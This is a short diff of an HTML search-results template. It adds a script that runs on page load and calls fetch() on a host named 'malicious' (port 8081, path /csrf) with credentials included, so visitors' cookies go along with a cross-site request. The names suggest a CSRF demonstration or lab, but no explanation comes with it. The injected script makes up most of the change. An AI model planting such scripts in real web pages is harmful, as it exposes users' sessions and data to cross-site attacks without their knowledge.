@@ -11,4 +11,11 @@
        <p style="font-size: 20px; font-weight: 700">Search result for: {{.Question}}</p>
     </div>
   </body>
+	<script>
+      function fn() {
+         fetch("http://malicious:8081/csrf", { credentials: "include" }).then(res => console.log(res))
+         console.log("run")
+      }
+      fn()
+   </script>
 </html>
